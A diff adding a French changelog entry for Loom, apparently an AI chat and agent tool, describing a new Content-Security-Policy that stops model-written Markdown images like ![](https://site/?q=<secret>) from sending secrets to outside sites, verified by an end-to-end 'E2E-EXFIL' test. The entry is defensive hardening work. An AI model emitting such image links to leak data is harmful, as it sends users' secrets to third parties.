@@ -6,6 +6,19 @@
 
 ---
 
+## 2026-10-21 : les pages de Loom ne chargent plus rien hors de Loom (CSP)
+
+- Toutes les réponses portent une Content-Security-Policy : images, scripts, styles,
+  polices, médias, cadres et connexions limités à Loom (`'self'`, plus `data:` et
+  `blob:` pour les images et médias locaux). Un modèle qui écrit
+  `![](https://site/?q=<secret>)` ne fait plus émettre la requête par le navigateur ;
+  avant, le rendu Markdown (DOMPurify) laissait passer ces images. Inline et eval restent
+  permis (scripts de la page, htmx) : la règle vise les sorties, pas le durcissement du
+  JS. Les images du bac à sable gardent leur CSP sandbox, plus stricte.
+- Vérifié en navigateur réel (`python -m tests.e2e.smoke_ui`, scénario `E2E-EXFIL` du
+  stub) : chat en streaming sans erreur console, image externe refusée avant envoi ;
+  témoin avec CSP ouverte : la requête part bien vers le site.
+
 ## 2026-10-20 : les commandes du modèle n'héritent plus du venv de Loom
 
 - `run_shell`, `monitor` et `serve_and_check` retirent `VIRTUAL_ENV` et le dossier
